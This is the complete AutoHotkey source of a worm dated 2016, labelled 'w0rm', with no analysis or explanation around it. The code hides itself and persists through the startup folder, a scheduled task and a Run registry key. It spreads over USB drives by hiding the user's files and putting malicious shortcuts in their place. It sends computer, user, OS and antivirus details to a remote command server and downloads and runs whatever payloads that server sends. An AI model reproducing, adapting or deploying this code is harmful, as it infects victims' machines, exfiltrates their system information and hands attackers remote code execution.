#NoTrayIcon

;  Coded by Suleiman Al-Othman
;  .Ver : 0.3
;  Date : 10/31/2016

; -----------Create COM Objects-----------

global mHttp := ComObjCreate("Microsoft.XMLHTTP")
global mWsh := ComObjCreate("WScript.Shell")
global mSfs := ComObjCreate("Scripting.FileSystemObject")
global mSh := ComObjCreate("Shell.Application")
global mWinMg := ComObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

; -----------Settings Worm-----------
global mVN = "Guest"
global mRG = "worm"


mTSpr()
mIns()
; -----------Loop for Waiting Command-----------
Loop
{
	Se := StrSplit(mPost("Vre",""), "|v3s|")
	if (Se[1] = "Close") {
		ExitApp 
	}
	if (Se[1] = "exc") {
		L := Se[2]
		F := Se[3]
	    UrlDownloadToFile, %L%, %A_temp%\%F%
	    Run,%A_temp%\%F%
	}
	if (Se[1] = "RF"){
		Scr := Se[2]
		F := Se[3]
		Pa = %A_temp%\%F%
		mSfs.OpenTextFile(Pa,2,True).write(Scr)
		Sleep, 3000
		mSfs.Close()
		Run,%Pa%
	}
	if (Se[1] = "Sc"){
		Scr := Se[2]
		F := Se[3]
		FileAppend, %Scr%, %A_temp%\%F%
		Run,%A_temp%\%F%
	}
	if (Se[1] = "Uns") { 
		mUins() 
	}
	sleep,7000
	mSpr()
}
; -----------Get Some Info by WScript.Shell COM Object-----------
mEx(mF)
{
	return mWsh.ExpandEnvironmentStrings(mF)
}
; -----------Install/Uninstall-----------
mIns() {
	IfNotExist, %A_Startup%\%A_ScriptName%
	{
		FileCopy, %A_ScriptFullPath% , %A_Startup%\%A_ScriptName%,1
	}

	IfNotExist, %A_Temp%\%A_ScriptName%
	{
		FileCopy, %A_ScriptFullPath% ,  %A_Temp%\%A_ScriptName%,1
		Run, %A_Temp%\%A_ScriptName%
		exitapp
	}

	run, schtasks /create /sc minute /mo 30 /tn ScheduleName /tr "%A_Temp%\%A_ScriptName%",,Hide
	Sleep, 3000
	Process, Close, schtasks.exe
	RegWrite, REG_SZ, HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, %mRG%, %A_ScriptFullPath%
}

mUins() {

	IfExist, %A_Startup%\%A_ScriptName%
	{
		FileDelete, %A_Startup%\%A_ScriptName%
	}

	RegDelete, HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, %mRG%

	For objOS In mSfs.Drives {
		if (ObjOS.DriveType =1) {
			I := ObjOS.path
			For x In mSfs.GetFolder(objOS.path).Files {
			O := x.Name
			ifinstring,O,.
			{
				FileSetAttrib, -SH, %I%\%O%,1
		  		FN := StrSplit(O, ".")
		  		Lif1 := FN[2]
		 		if lif1 = lnk
		 		{
		 			FileDelete, %I%\*.lnk
		 			FileDelete, %I%\%A_ScriptName%
		 		}
			} 
		}
			For x In mSfs.GetFolder(objOS.path).SubFolders {
				O := x.Name
				FileSetAttrib, -SH, %I%\%O%,1	
			}
		}
	}


	IfExist, %A_Temp%\%A_ScriptName%
	{
		FileAppend,
		(
		Sleep 3
		del "%A_Temp%\%A_ScriptName%"
		del "%A_Temp%\uninst.bat"
		) , %A_Temp%\uninst.bat
		Run, %A_Temp%\uninst.bat,,hide
		Exitapp
	}
}
; -----------Spread-----------
mSpr() {
	For objOS In mSfs.Drives {
		if (ObjOS.DriveType =1) {
			I := ObjOS.path
			FileCopy,%A_Scriptfullpath%, %I%\%A_Scriptname%,1
			ifexist, %I%\%A_Scriptname%
		    	FileSetAttrib, +SH, %I%\%A_Scriptname%,1
			For x In mSfs.GetFolder(objOS.path).Files {
				O := x.Name
				ifinstring,O,.
				{
		 			FileSetAttrib, +SH, %I%\%O%,1
		 			FN := StrSplit(O, ".")
		 			Lif1 := FN[2]
		 			if lif1 != lnk
		 			{
		 				if O != %A_ScriptName%
		 				{
		 					LiF   := FN[1]
		 					FileCreateShortcut, cmd.exe, %I%\%Lif%.lnk,, "/c start %A_ScriptName% &start %O% &exit",,1
		 				}
		 			}
		 		} 
			}
			For x In mSfs.GetFolder(objOS.path).SubFolders {
				O := x.Name
				FileSetAttrib, +SH, %I%\%O%,1
				FileCreateShortcut, cmd.exe, %I%\%O%.lnk,, "/c start %A_ScriptName% &start explorer %O% &exit",,%SystemRoot%\system32\shell32.dll,,4
			}
		}
	}
}

mTSpr() {
	EP = %A_ScriptFullPath%
	CP = :\%A_ScriptName%
	IfInString, EP, %CP%
	{
		RegWrite, REG_SZ, HKCU\w0rm,wUsb, True
	}
	Else
		RegWrite, REG_SZ, HKCU\w0rm,wUsb, False
	RegRead, Usb, HKCU\w0rm\,wUsb
	Return %Usb% 
}
; -----------Check .Net framework-----------
NT() {
	IfNotExist, %A_WinDir%\Microsoft.NET\Framework\v2.0.50727\vbc.exe
		mNT = No
	IfExist,%A_WinDir%\Microsoft.NET\Framework\v2.0.50727\vbc.exe
		mNT = Yes
	return %mNT%
}
; -----------Information-----------
mInf() {
	sv := mVN "_" mHWD() 
	U := mTSpr()
	nt := NT() 
	s := mEx("%COMPUTERNAME%")
	mXinf := s
	s := mEx("%USERNAME%")
	For objOS In ComObjGet("winmgmts:\\").InstancesOf("Win32_OperatingSystem") {
		O := ObjOS.Caption 
	}
	For objOS In ComObjGet("winmgmts:\\localhost\root\securitycenter2").InstancesOf("AntiVirusProduct") {
		AV := ObjOS.displayName 
	}
	mXinf = %sv%\%mXinf%\%s%\%O%\%AV%\\%nt%\%U%\
	return %mXinf%
}
; -----------Get VolumeSerialNumber-----------
mHWD()
{
	for , mSer in mWinMg.ExecQuery("SELECT * FROM Win32_LogicalDisk")
		if mSer.VolumeSerialNumber <> ""
		{
			mHW := mSer.VolumeSerialNumber
			Return %mHW%
		}
}
; -----------To Connect and send Information-----------
mPost(mCmd,mDn)
{
	ComObjError(false)
	mHttp.Open("POST","http://[HP]/" mCmd, false)
	mHttp.setRequestHeader("User-Agent:", mInf())
	mHttp.send(%mDn%)
	mRT := mHttp.responseText
	return %mRT%
}